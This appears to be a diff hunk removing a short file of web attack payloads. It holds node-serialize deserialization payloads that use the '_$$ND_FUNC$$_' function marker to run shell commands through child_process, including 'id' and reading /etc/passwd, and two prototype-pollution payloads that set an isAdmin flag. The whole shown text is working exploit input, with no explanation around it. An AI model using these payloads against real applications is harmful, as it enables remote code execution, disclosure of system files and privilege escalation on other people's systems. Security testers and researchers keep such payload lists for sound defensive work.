@@ -1,7 +1,0 @@
-var serialize = require('node-serialize');var payload = {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"};serialize.unserialize(serialize.serialize(payload));
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
-{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /etc/passwd').toString()}()"}
-{"username":{"toString":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}"}}
-{"__proto__":{"isAdmin":true}}
-{"constructor":{"prototype":{"isAdmin":true}}}
